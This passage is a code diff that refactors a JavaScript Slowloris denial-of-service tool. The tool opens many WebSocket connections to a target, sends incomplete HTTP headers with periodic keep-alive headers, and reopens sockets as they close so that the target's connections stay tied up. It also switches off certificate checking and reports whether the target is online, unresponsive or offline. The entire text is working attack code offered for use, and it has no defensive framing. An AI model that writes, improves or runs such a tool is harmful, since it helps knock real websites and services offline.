@@ -14,13 +14,17 @@ function slowloris(target, numSockets, statsCallback) {
     let bytesSent = 0;
     let statsInterval;
     let attackActive = true;
+    let hostname;
+    let port;
+    let isSecure;
+    let path;
 
     try {
         const parsedTarget = new URL(target);
-        const hostname = parsedTarget.hostname;
-        const port = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);
-        const isSecure = parsedTarget.protocol === 'https:';
-        const path = parsedTarget.pathname || "/";
+        hostname = parsedTarget.hostname;
+        port = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);
+        isSecure = parsedTarget.protocol === 'https:';
+        path = parsedTarget.pathname || "/";
 
         if (!numSockets || numSockets <= 0) {
             numSockets = 200;
@@ -44,107 +48,118 @@ function slowloris(target, numSockets, statsCallback) {
 
         statsInterval = setInterval(updateStats, 1000);
 
-        function createSocket(hostname, port, index, isSecure, path) {
-            if (!attackActive) return;
-            let socket;
-            try {
-                const protocol = isSecure ? 'wss://' : 'ws://';
-                socket = new WebSocket(`${protocol}${hostname}:${port}${path}`, {
-                    origin: `${protocol}${hostname}`,
-                    rejectUnauthorized: false
-                });
+        } catch (error) {
+        console.error("Error during Slowloris setup:", error.message);
+        return {
+            stop: () => {
+                console.log("Slowloris attack setup failed. No sockets to close.");
+                clearInterval(statsInterval); // Stop stats interval even if setup fails
+            }
+        };
+    }
 
-                sockets.push(socket);
+    function createSocket(index) {
+        if (!attackActive) return;
+        let socket;
+        try {
+            const protocol = isSecure ? 'wss://' : 'ws://';
+            socket = new WebSocket(`${protocol}${hostname}:${port}${path}`, {
+                origin: `${protocol}${hostname}`,
+                rejectUnauthorized: false // Consider removing in production
+            });
 
-                socket.on('open', () => {
-                    console.log(`Socket ${index + 1} opened.`);
-                    targetStatus = "Online";
-                    sendInitialHeader(socket, hostname, path);
-                    const keepAliveInterval = setInterval(() => {
-                        sendKeepAliveHeader(socket);
-                    }, 15000);
+            sockets.push(socket);
 
-                    socket.keepAliveInterval = keepAliveInterval;
-                });
+            socket.on('open', () => {
+                console.log(`Socket ${index + 1} opened.`);
+                targetStatus = "Online";
+                sendInitialHeader(socket, hostname, path);
+                const keepAliveInterval = setInterval(() => {
+                    sendKeepAliveHeader(socket);
+                }, 15000);
 
-                socket.on('close', () => {
-                    console.log(`Socket ${index + 1} closed.`);
-                    removeSocket(socket);
-                    clearInterval(socket.keepAliveInterval);
-                    if (sockets.length === 0) {
-                        targetStatus = "Offline";
-                    }
-                });
+                socket.keepAliveInterval = keepAliveInterval;
+            });
 
-                socket.on('error', (error) => {
-                    console.error(`Socket ${index + 1} error: ${error.message}`);
-                    targetStatus = "Unresponsive";
-                    closeSocket(socket, index);
-                });
-
-                socket.on('message', (data) => {
-                });
-
-
-            } catch (socketError) {
-                console.error(`Error creating socket ${index + 1}:`, socketError.message);
+            socket.on('close', () => {
+                console.log(`Socket ${index + 1} closed.`);
                 removeSocket(socket);
-            } finally {
-                 if (attackActive && sockets.length < numSockets) {
-                    setTimeout(() => createSocket(hostname, port, index, isSecure, path), 100);
+                clearInterval(socket.keepAliveInterval);
+                if (sockets.length === 0) {
+                    targetStatus = "Offline";
                 }
+                if (attackActive) {
+                    setTimeout(() => createSocket(index), 100); // Recreate socket if attack is active
+                }
+            });
+
+            socket.on('error', (error) => {
+                console.error(`Socket ${index + 1} error: ${error.message}`);
+                targetStatus = "Unresponsive";
+                closeSocket(socket, index);
+            });
+
+            socket.on('message', (data) => {
+                //console.log(`Received message from socket ${index + 1}: ${data}`); // Log received data if needed for debugging
+            });
+
+
+        } catch (socketError) {
+            console.error(`Error creating socket ${index + 1}:`, socketError.message);
+        } finally {
+             if (attackActive && sockets.length < numSockets) {
+                //setTimeout(() => createSocket(index), 100);  Moved socket recreation to close event
             }
         }
+    }
 
-        function sendInitialHeader(socket, hostname, path) {
-            const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\nX-Custom-Header: initial\r\n\r\n`;
-            sendMessage(socket, initialHeader);
-        }
+    function sendInitialHeader(socket, hostname, path) {
+        const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\nX-Custom-Header: initial\r\n\r\n`;
+        sendMessage(socket, initialHeader);
+    }
 
-        function sendKeepAliveHeader(socket) {
-            const keepAliveHeader = "X-Custom-Header: keep-alive\r\n\r\n";
-            sendMessage(socket, keepAliveHeader);
-        }
+    function sendKeepAliveHeader(socket) {
+        const keepAliveHeader = "X-Custom-Header: keep-alive\r\n\r\n";
+        sendMessage(socket, keepAliveHeader);
+    }
 
-        function sendMessage(socket, message) {
-             try {
-                if (socket.readyState === WebSocket.OPEN) {
-                    socket.send(message);
-                    packetsSent++;
-                    bytesSent += message.length;
-                } else {
-                    closeSocket(socket);
-                }
-            } catch (error) {
-                console.error("Error sending message:", error.message);
+    function sendMessage(socket, message) {
+         try {
+            if (socket.readyState === WebSocket.OPEN) {
+                socket.send(message);
+                packetsSent++;
+                bytesSent += message.length;
+            } else {
                 closeSocket(socket);
             }
+        } catch (error) {
+            console.error("Error sending message:", error.message);
+            closeSocket(socket);
         }
-
-        function closeSocket(socket, index) {
-            try {
-                if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) {
-                    clearInterval(socket.keepAliveInterval);
-                    socket.close();
-                }
-                removeSocket(socket);
-            } catch (closeError) {
-                console.error(`Error closing socket ${index ? index + 1 : ''}:`, closeError.message);
-            }
-        }
-
-        function removeSocket(socket) {
-             sockets = sockets.filter(s => s !== socket);
-        }
-
-        for (let i = 0; i < numSockets; i++) {
-            createSocket(hostname, port, i, isSecure, path);
-        }
-
-
-    } catch (error) {
-        console.error("Error during Slowloris setup:", error.message);
     }
+
+    function closeSocket(socket, index) {
+        try {
+            if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) {
+                clearInterval(socket.keepAliveInterval);
+                socket.close();
+            }
+            removeSocket(socket);
+        } catch (closeError) {
+            console.error(`Error closing socket ${index ? index + 1 : ''}:`, closeError.message);
+        }
+    }
+
+    function removeSocket(socket) {
+         sockets = sockets.filter(s => s !== socket);
+    }
+
+    for (let i = 0; i < numSockets; i++) {
+        createSocket(i);
+    }
+
+
+
 
     return {
         stop: () => {
